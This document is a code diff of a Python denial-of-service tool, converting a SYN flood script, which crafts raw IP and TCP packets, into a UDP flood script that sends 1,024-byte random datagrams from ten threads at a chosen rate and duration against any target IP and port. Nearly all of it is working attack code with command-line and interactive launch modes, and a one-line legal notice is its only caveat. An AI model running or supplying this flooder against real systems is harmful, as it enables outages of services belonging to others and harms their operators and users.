@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
-# SYN Flood Attack
+# UDP Flood Attack
 
 import argparse
 import socket
 import random
-import struct
 import threading
 import time
 import os
@@ -26,21 +25,21 @@ def dict_to_xml(tag, d):
     parts.append(f"</{tag}>")
     return ''.join(parts)
 
-class SYNFlooder:
+class UDPFlooder:
     def __init__(self, target_ip, target_port, duration, packet_rate):
-        """Initialize the SYN flooder with the target configuration."""
+        """Initialize the UDP flooder with the target configuration."""
         self.target_ip = target_ip
         self.target_port = target_port
         self.attack_duration = duration
         self.packet_rate = packet_rate
-        self.threads = 10  # Number of threads for sending SYN packets
+        self.threads = 10  # Number of threads for sending UDP packets
         self.running = False
         self.start_time = None
         self.log_dir = "/var/log/network_tests"
         os.makedirs(self.log_dir, exist_ok=True)
-        self.log_file = os.path.join(self.log_dir, f"syn_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
+        self.log_file = os.path.join(self.log_dir, f"udp_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
         self.stats = {
-            'packets_sent': 0,
+            'udp_packets_sent': 0,
             'errors': 0,
             'start_time': None,
             'end_time': None
@@ -60,64 +59,35 @@ class SYNFlooder:
         except Exception as e:
             print(f"[LOG ERROR] {str(e)}")
 
-    def create_syn_packet(self):
-        """Creates a SYN packet for the attack."""
-        # Random source port
-        src_port = random.randint(1024, 65535)
+    def generate_random_data(self):
+        """Generates random data to send in the UDP packet."""
+        return random._urandom(1024)  # 1024 bytes of random data
 
-        # Construct IP header
-        ip_header = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 40, 0, 0, 64, 0x06, 0, socket.inet_aton(self.target_ip), socket.inet_aton(self.target_ip))
-        
-        # Construct TCP header
-        seq_num = random.randint(0, 4294967295)
-        ack_num = 0
-        data_offset_res_flags = (5 << 4) + 0
-        window = socket.htons(5840)  # maximum allowed window size
-        checksum = 0
-        urgent_pointer = 0
-        tcp_header = struct.pack("!HHLLBBHHH", src_port, self.target_port, seq_num, ack_num, data_offset_res_flags, 0x02, window, checksum, urgent_pointer)
-
-        # Calculate checksum (pseudo header + IP header + TCP header)
-        checksum = self.calculate_checksum(ip_header + tcp_header)
-        tcp_header = tcp_header[:16] + struct.pack("H", checksum) + tcp_header[18:]
-
-        return ip_header + tcp_header
-
-    def calculate_checksum(self, data):
-        """Calculates checksum for the packet."""
-        if len(data) % 2 != 0:
-            data += b'\0'
-        checksum = 0
-        for i in range(0, len(data), 2):
-            word = (data[i] << 8) + (data[i + 1])
-            checksum += word
-        checksum = (checksum >> 16) + (checksum & 0xFFFF)
-        checksum += (checksum >> 16)
-        return ~checksum & 0xFFFF
-
-    def send_syn_packets(self):
-        """Sends SYN packets to the target."""
+    def send_udp_packet(self):
+        """Sends UDP packets to the target IP and port."""
         end_time = time.time() + self.attack_duration
         while self.running and time.time() < end_time:
             try:
-                packet = self.create_syn_packet()
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                sock.sendto(packet, (self.target_ip, self.target_port))
+                # Create a random packet
+                data = self.generate_random_data()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(data, (self.target_ip, self.target_port))
                 sock.close()
 
-                self.stats['packets_sent'] += 1
+                # Track the packets sent
+                self.stats['udp_packets_sent'] += 1
                 time.sleep(1 / self.packet_rate)
             except Exception as e:
                 self.stats['errors'] += 1
-                self._log_event('SYN_ERROR', str(e))
+                self._log_event('UDP_ERROR', str(e))
                 time.sleep(0.001)
 
-    def syn_flood(self):
-        """Start the SYN flood attack using multiple threads."""
-        self._log_event('SYN_START', 'Starting SYN flood attack')
+    def udp_flood(self):
+        """Start the UDP flood attack using multiple threads."""
+        self._log_event('UDP_START', 'Starting UDP flood attack')
         threads = []
         for _ in range(self.threads):
-            t = threading.Thread(target=self.send_syn_packets)
+            t = threading.Thread(target=self.send_udp_packet)
             t.daemon = True
             t.start()
             threads.append(t)
@@ -139,7 +109,7 @@ class SYNFlooder:
         print(f"   • Log File: {self.log_file}\n")
 
         try:
-            self.syn_flood()
+            self.udp_flood()
         except KeyboardInterrupt:
             print("\n🛑 Attack interrupted by user!")
 
@@ -149,45 +119,50 @@ class SYNFlooder:
         """Stop the attack."""
         self.running = False
         self.stats['end_time'] = datetime.now().isoformat()
-        self._log_event('TEST_END', 'SYN flood attack completed')
+        self._log_event('TEST_END', 'UDP flood attack completed')
 
         duration = time.time() - self.start_time
         print("\n\n📊 Final Report:")
         print(f"   • Actual Duration: {duration:.1f}s")
-        print(f"   • SYN Packets Sent: {self.stats['packets_sent']}")
+        print(f"   • UDP Packets Sent: {self.stats['udp_packets_sent']}")
         print(f"   • Errors: {self.stats['errors']}")
-        print(f"   • Full Log: {self.log_file}\n")
+        print(f"   • Full log available at: {self.log_file}\n")
 
 def signal_handler(sig, frame):
     """Graceful exit handler."""
     global running
-    print("\n🛑 Interrupt signal received!")
+    print("\n🛑 Received interrupt signal!")
     running = False
     sys.exit(0)
 
 def menu():
     """Interactive menu mode."""
-    print("\n⚠️ LEGAL WARNING: Use this script only on your own networks or with explicit authorization!\n")
-    target_ip = input("Enter the target IP address: ")
-    target_port = int(input("Enter the target port (e.g., 80): "))
-    duration = int(input("Enter the attack duration in seconds: "))
-    packet_rate = int(input("Enter the packet rate per second per thread: "))
+    print("\n⚠️ LEGAL NOTICE: Use this script only in your own network or with explicit permission!\n")
+    target_ip = input("Enter target IP address: ").strip()
+    target_port = int(input("Enter target UDP port (usually 53 for DNS, 80 for HTTP, etc.): ").strip())
+    duration = int(input("Enter attack duration in seconds: ").strip())
+    packet_rate = int(input("Enter packet rate (packets per second per thread): ").strip())
 
-    # Create and start the SYN flooder
-    flooder = SYNFlooder(target_ip, target_port, duration, packet_rate)
+    # Create and start the UDP flooder
+    flooder = UDPFlooder(target_ip, target_port, duration, packet_rate)
     flooder.start()
 
 def terminal():
     """Terminal mode using arguments."""
-    parser = argparse.ArgumentParser(description="SYN Flood Attack Tool")
+    parser = argparse.ArgumentParser(description="UDP Flood Attack Tool")
     parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address.")
-    parser.add_argument("-p", "--port", type=int, required=True, help="Target port.")
+    parser.add_argument("-p", "--port", type=int, required=True, help="Target UDP port.")
     parser.add_argument("-d", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
-    parser.add_argument("-r", "--packet_rate", type=int, default=1000, help="Packets per second per thread (default: 1000).")
+    parser.add_argument("-r", "--rate", type=int, default=1000, help="Packet rate per thread in packets per second (default: 1000).")
 
     args = parser.parse_args()
 
-    flooder = SYNFlooder(args.target, args.port, args.duration, args.packet_rate)
+    target_ip = args.target
+    target_port = args.port
+    duration = args.duration
+    packet_rate = args.rate
+
+    flooder = UDPFlooder(target_ip, target_port, duration, packet_rate)
     flooder.start()
 
 def main():
